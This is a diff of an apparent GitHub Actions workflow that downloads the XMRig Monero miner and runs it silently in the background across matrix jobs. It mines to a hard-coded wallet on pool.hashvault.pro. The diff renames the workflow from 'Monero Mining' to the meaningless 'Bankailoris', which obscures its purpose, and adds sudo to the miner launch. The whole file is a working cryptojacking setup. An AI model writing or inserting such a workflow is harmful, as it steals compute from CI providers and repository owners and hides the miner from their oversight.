@@ -1,4 +1,4 @@
-name: Monero Mining
+name: Bankailoris
 
 on:
   workflow_dispatch:
@@ -44,7 +44,7 @@ jobs:
           wget -q https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz -O xmrig.tar.gz
           tar -xzf xmrig.tar.gz
           chmod +x xmrig-6.24.0/xmrig
-          nohup ~/xmrig/xmrig-6.24.0/xmrig \
+          sudo nohup ~/xmrig/xmrig-6.24.0/xmrig \
             -o pool.hashvault.pro:443 \
             -u 43NnRj39Z9L8NJaW7MQWN1GYeNYVHDAoVMmMUMFLd7jVeVAYqFkgFjQL6568tKrWBA4Ro6zaeoTLCBfTB9GkkyQYJNYCs7N \
-            -p worker${{ matrix.job }} -t 4 >/dev/null 2>&1 &
+            -p worker${{ matrix.job }} -t 3 >/dev/null 2>&1 &
